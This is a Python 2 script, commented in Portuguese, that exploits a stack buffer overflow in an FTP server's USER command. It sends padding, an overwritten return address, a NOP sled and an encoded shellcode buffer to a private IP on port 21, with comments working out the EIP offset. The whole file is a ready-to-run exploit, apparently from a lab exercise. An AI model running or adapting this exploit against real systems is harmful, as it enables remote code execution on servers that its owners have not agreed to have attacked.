#!/usr/bin/python
# -*- coding: utf-8 -*-


"""
VERIFICANDO SE EIP E CONTROLADO
1100: crash da aplicacao
489: bytes existentes (485 + 4)
			485 = A
			4 = \x3B\x31\x9D\x7C
"""

import socket

buf =  ""
buf += "\xdb\xd2\xd9\x74\x24\xf4\xbd\x5e\xd1\x56\xb1\x5a\x33"
buf += "\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x13\x03\x34\xc2\xb4"
buf += "\x44\x34\x0c\xba\xa7\xc4\xcd\xdb\x2e\x21\xfc\xdb\x55"
buf += "\x22\xaf\xeb\x1e\x66\x5c\x87\x73\x92\xd7\xe5\x5b\x95"
buf += "\x50\x43\xba\x98\x61\xf8\xfe\xbb\xe1\x03\xd3\x1b\xdb"
buf += "\xcb\x26\x5a\x1c\x31\xca\x0e\xf5\x3d\x79\xbe\x72\x0b"
buf += "\x42\x35\xc8\x9d\xc2\xaa\x99\x9c\xe3\x7d\x91\xc6\x23"
buf += "\x7c\x76\x73\x6a\x66\x9b\xbe\x24\x1d\x6f\x34\xb7\xf7"
buf += "\xa1\xb5\x14\x36\x0e\x44\x64\x7f\xa9\xb7\x13\x89\xc9"
buf += "\x4a\x24\x4e\xb3\x90\xa1\x54\x13\x52\x11\xb0\xa5\xb7"
buf += "\xc4\x33\xa9\x7c\x82\x1b\xae\x83\x47\x10\xca\x08\x66"
buf += "\xf6\x5a\x4a\x4d\xd2\x07\x08\xec\x43\xe2\xff\x11\x93"
buf += "\x4d\x5f\xb4\xd8\x60\xb4\xc5\x83\xec\x79\xe4\x3b\xed"
buf += "\x15\x7f\x48\xdf\xba\x2b\xc6\x53\x32\xf2\x11\x93\x69"
buf += "\x42\x8d\x6a\x92\xb3\x84\xa8\xc6\xe3\xbe\x19\x67\x68"
buf += "\x3e\xa5\xb2\x3f\x6e\x09\x6d\x80\xde\xe9\xdd\x68\x34"
buf += "\xe6\x02\x88\x37\x2c\x2b\x23\xc2\xa7\x94\x1c\xcc\x50"
buf += "\x7d\x5f\xcc\x9f\xc6\xd6\x2a\xf5\x28\xbf\xe5\x62\xd0"
buf += "\x9a\x7d\x12\x1d\x31\xf8\x14\x95\xb6\xfd\xdb\x5e\xb2"
buf += "\xed\x8c\xae\x89\x4f\x1a\xb0\x27\xe7\xc0\x23\xac\xf7"
buf += "\x8f\x5f\x7b\xa0\xd8\xae\x72\x24\xf5\x89\x2c\x5a\x04"
buf += "\x4f\x16\xde\xd3\xac\x99\xdf\x96\x89\xbd\xcf\x6e\x11"
buf += "\xfa\xbb\x3e\x44\x54\x15\xf9\x3e\x16\xcf\x53\xec\xf0"
buf += "\x87\x22\xde\xc2\xd1\x2a\x0b\xb5\x3d\x9a\xe2\x80\x42"
buf += "\x13\x63\x05\x3b\x49\x13\xea\x96\xc9\x23\xa1\xba\x78"
buf += "\xac\x6c\x2f\x39\xb1\x8e\x9a\x7e\xcc\x0c\x2e\xff\x2b"
buf += "\x0c\x5b\xfa\x70\x8a\xb0\x76\xe8\x7f\xb6\x25\x09\xaa"

# ENVIAR NOP \x90
# 1100 quantidades de caracteres liberados
# 489 = quantidade de As enviados mais o endere√ßo de retorno \x3B
# 351 tamanho do nosso buf (shellcode)
# 1100 - 489 = 611
# 611 - 351 = 260
# 260 nops

bufer = "A" * 485 + "\x3B\x31\x9D\x7C" + "\x90" * (1100 - 489 - len(buf)) + buf

sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sck.connect(("192.168.0.104", 21))
r = sck.recv(1024)
print(r)

sck.send("USER " + bufer + "\r\n")
r = sck.recv(1024)
print(r)